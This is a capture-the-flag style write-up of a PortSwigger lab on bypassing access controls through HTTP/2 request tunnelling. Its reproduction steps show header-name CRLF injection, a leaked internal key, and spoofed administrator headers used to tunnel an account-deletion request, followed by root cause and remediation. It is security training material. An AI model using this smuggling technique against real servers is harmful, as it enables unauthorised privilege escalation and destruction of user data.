
# PS‑011 — Bypassing access controls via HTTP/2 request tunnelling

**Date / Analyst:** 2025-09-30 — Christopher Araque
**Target:** PortSwigger lab (insecure role enforcement)
**Impact:** Privilege escalation via client-controlled role flag
**Status:** Solved

## Summary
CRLF injection in header names, sumggled Content-Length, discovery of X-FRONTEND-KEY, and tunneling GET /admin/delete?username=carlos.

## Repro (minimal)
- HTTP/2 request in Repeater → header‑name CRLF injection with a smuggled Content‑Length and search=x.

- Observe reflected headers revealing X-FRONTEND-KEY: 5268042407204950.

- Outer request HEAD; tunnel GET /login with:

    X-SSL-VERIFIED: 1
    X-SSL-CLIENT-CN: administrator
    X-FRONTEND-KEY: 5268042407204950


- Replace with GET /admin/delete?username=carlos:
    foo: bar

    GET /admin/delete?username=carlos HTTP/1.1
    X-SSL-VERIFIED: 1
    X-SSL-CLIENT-CN: administrator
    X-FRONTEND-KEY: 5268042407204950




## Evidence
- Screenshot: [ps-011-screenshot.png](../../evidence/ps-access/ps-011-screenshot.png)
- Request/response: [ps-011-request.txt](../../evidence/ps-access/ps-011-request.txt)

## Root cause
- Front end downgrades HTTP/2 → HTTP/1.1 and doesn’t sanitize header names, enabling request tunnelling.
- Back end trusts front‑end injected auth headers (X-SSL-*, X-FRONTEND-KEY) to make access decisions.

## Remediation
- Validate/normalize header names.
- Don’t trust client‑controlled auth headers; mint auth server‑side (mTLS between tiers or signed tokens).
- Avoid unsafe H2→H1 downgrading; keep H2 end‑to‑end or use a strict translation that never forwards raw header bytes.
- Unified length handling; add anomaly detection for tunnelling patterns.

## References
- OWASP Top 10 A01: Broken Access Control
- Request Smuggling / HTTP/2 Request Tunnelling (PortSwigger labs & write‑ups)
